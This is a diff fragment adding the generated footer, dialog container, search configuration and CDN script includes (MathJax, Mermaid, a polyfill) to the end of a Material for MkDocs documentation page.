+<footer class="md-footer">
+<div class="md-footer-meta md-typeset">
+<div class="md-footer-meta__inner md-grid">
+<div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" rel="noopener" target="_blank">
+      Material for MkDocs
+    </a>
+</div>
+</div>
+</div>
+</footer>
+</div>
+<div class="md-dialog" data-md-component="dialog">
+<div class="md-dialog__inner md-typeset"></div>
+</div>
+<script id="__config" type="application/json">{"base": "..", "features": [], "search": "../assets/javascripts/workers/search.e5c33ebb.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
+<script src="../assets/javascripts/bundle.51d95adb.min.js"></script>
+<script src="../javascripts/mathjax.js"></script>
+<script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
+<script src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
+<script src="https://unpkg.com/mermaid/dist/mermaid.min.js"></script>
+</body>
+</html>
